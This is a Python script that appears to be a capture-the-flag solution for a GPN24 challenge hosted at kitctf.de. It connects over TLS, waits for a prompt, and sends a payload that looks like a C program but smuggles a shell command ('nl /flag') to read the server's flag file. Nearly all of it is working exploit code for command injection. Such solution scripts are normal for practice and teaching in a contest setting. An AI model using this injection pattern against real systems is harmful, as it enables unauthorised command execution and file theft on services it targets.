#!/usr/bin/env python3
import socket
import ssl


HOST = "glazed-kimchi-infused-with-shaved-tomato-czzv.gpn24.ctf.kitctf.de"
PORT = 443
PAYLOAD = 'int main(){("=0;nl /flag;#")();}\n'


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main() -> None:
    ctx = ssl.create_default_context()
    with socket.create_connection((HOST, PORT)) as raw:
        with ctx.wrap_socket(raw, server_hostname=HOST) as sock:
            banner = recv_until(sock, b"> ")
            print(banner.decode("utf-8", errors="replace"), end="")
            sock.sendall(PAYLOAD.encode())

            out = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                out += chunk

    text = out.decode("utf-8", errors="replace")
    print(text, end="")


if __name__ == "__main__":
    main()
